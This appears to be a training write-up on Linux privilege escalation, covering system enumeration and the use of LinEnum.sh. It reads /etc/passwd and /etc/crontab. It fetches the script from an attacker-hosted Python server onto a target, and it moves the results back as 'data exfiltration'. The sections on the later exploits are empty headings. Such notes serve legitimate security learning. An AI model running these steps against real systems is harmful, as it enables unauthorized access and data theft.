# Linux Privilege Escalation

## Enumeration

### Query the System

Query the hostname: `:> hostname`  

Identify system users: `:> cat /etc/passwd`  

Identify potentially useful shells on the system: `:> cat /etc/shells`

List cron jobs: `:> cat /etc/crontab`

### LinEnum.sh to Exfiltrate the system information

[Get Linenum](!https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)  

Onto the attacking device

`:> wget -O LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh`

Gain access to the target machine

![Logged In](asset/Linux-PrivEsc-01-LinEnum-01.png)

Open a simple server on the attacking device in the directory from where LinEnum can be transported.

`:> python3 -m http.server 8888`

![Python Server](assets/Linux-PrivEsc-01-LinEnum-02.png)  

On the target device, set up a location from where the script will run.  

![Target Locationls](assets/Linux-PrivEsc-01-LinEnum-03.png)  

Pull the script from the python server to the target device.  

`:> wget 10.201.47.243:8888/LinEnum.sh`

The serving attacker logs the "GET" request and the target device recevies the script

![wget LinEnum](assets/Linux-PrivEsc-01-LinEnum-04a.png)  

If the target device is permitted a WAN connection, pull the script from GitHub.

`:> wget -O LinEnumFromGit.sh https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh`  

Add execution privileges to the script 

`:> chmod +x LinEnum.py`

![with exeuction](assets/Linux-PrivEsc-01-LinEnum-05.png)  

Run the script and output to a file that can be studied for escalation opportunities

`:> ./LinEnum.sh > enum.txt`

Shutdown the server on the attacking device

![Server Shutdown](assets/Linux-PrivEsc-01-LinEnum-06.png)  

Reverse the server setup and transfer the enum.txt to the attacking device for analysis and resource development.

![Data Exfiltration](assets/Linux-PrivEsc-01-LinEnum-07.png)

### Use FIND to identify useful file properties and attributes  


## SUID/GUID 

## Writeable /etc/passwd files

## Escaping the Vi editor

## Exploit Crontab

## Exploiting the PATH variable